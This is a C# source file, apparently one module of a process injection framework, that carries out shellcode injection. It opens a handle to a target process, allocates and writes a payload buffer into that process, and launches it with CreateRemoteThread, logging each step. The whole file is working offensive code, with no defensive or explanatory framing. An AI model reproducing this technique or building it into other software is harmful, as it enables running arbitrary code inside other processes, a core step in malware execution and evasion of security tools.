using PIF.Misc;
using System;

namespace PIF.Inject.SC {
    internal class CreateRemoteThread {
        public static void Invoke(Init pif) {
            Output.Write("Opening a handle to the target process");
            IntPtr hProcess = Helpers.GetProcessHandle(pif);
            if (hProcess == IntPtr.Zero) {
                PIFException.Throw("Failed to open handle.");
            }

            Output.Write("Allocating new buffer and writing payload into the target process");
            if (!Helpers.AllocAndWriteMemory(hProcess, pif.payloadBytes, out IntPtr hBuffer)) {
                PIFException.Throw($"Failed to {(hBuffer == IntPtr.Zero ? "allocate memory in" : "write to")} target process.");
            }

            Output.Write("Calling 'CreateRemoteThread()'");
            if (PInvoke.CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBuffer, IntPtr.Zero, 0, IntPtr.Zero) == IntPtr.Zero) {
                PIFException.Throw("Failed to create new thread.");
            }
        }
    }
}
